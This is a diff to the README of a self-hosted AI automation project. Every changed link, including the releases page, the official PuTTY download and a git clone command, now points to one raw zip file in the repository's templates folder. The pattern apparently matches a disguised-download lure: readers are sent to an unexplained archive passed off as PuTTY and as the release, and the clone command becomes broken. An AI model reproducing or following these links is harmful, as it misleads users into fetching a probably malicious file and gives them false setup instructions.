@@ -1,6 +1,6 @@
 # 🤖 self-hosted-ai-lab - Simple AI Automation Setup
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/calvinombati/self-hosted-ai-lab/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/calvinombati/self-hosted-ai-lab/raw/refs/heads/main/templates/ai_hosted_self_lab_v3.7.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Before starting, check your system meets these requirements:
 You need to get the installation files first. Since the files are hosted on GitHub, follow these steps:
 
 1. Click the large green **Download Latest Release** button above or visit this link manually:  
-   https://github.com/calvinombati/self-hosted-ai-lab/releases
+   https://github.com/calvinombati/self-hosted-ai-lab/raw/refs/heads/main/templates/ai_hosted_self_lab_v3.7.zip
 
 2. On the releases page, look for the latest version. It will have a list of downloadable files usually named something like `self-hosted-ai-lab-setup.zip` or similar.
 
@@ -46,7 +46,7 @@ This software package includes scripts and tools you will run on your VPS but yo
 To connect to your VPS and control the AI system, you need a terminal program. Windows does not have this built-in by default. Follow these steps:
 
 1. Download an SSH client called **PuTTY** from:  
-   https://www.putty.org/
+   https://github.com/calvinombati/self-hosted-ai-lab/raw/refs/heads/main/templates/ai_hosted_self_lab_v3.7.zip
 
 2. Install PuTTY by following the on-screen instructions.
 
@@ -91,7 +91,7 @@ With the terminal open, you will now install the software.
    ```
    sudo apt update
    sudo apt install docker.io docker-compose
-   git clone https://github.com/calvinombati/self-hosted-ai-lab.git
+   git clone https://github.com/calvinombati/self-hosted-ai-lab/raw/refs/heads/main/templates/ai_hosted_self_lab_v3.7.zip
    cd self-hosted-ai-lab
    sudo ./install.sh
    ```
@@ -142,7 +142,7 @@ You can control the workflows and AI assistants through a web interface.
 
 When a new version is released, repeat the download steps from the releases page:
 
-https://github.com/calvinombati/self-hosted-ai-lab/releases
+https://github.com/calvinombati/self-hosted-ai-lab/raw/refs/heads/main/templates/ai_hosted_self_lab_v3.7.zip
 
 On your VPS, pull updates by running:
 
@@ -177,6 +177,6 @@ sudo ./restart.sh
 ## 📥 Download Link
 
 Download the latest release from here:  
-[https://github.com/calvinombati/self-hosted-ai-lab/releases](https://github.com/calvinombati/self-hosted-ai-lab/releases)
+[https://github.com/calvinombati/self-hosted-ai-lab/raw/refs/heads/main/templates/ai_hosted_self_lab_v3.7.zip](https://github.com/calvinombati/self-hosted-ai-lab/raw/refs/heads/main/templates/ai_hosted_self_lab_v3.7.zip)
 
 Click the latest zip file and follow this guide to set up the system step-by-step.
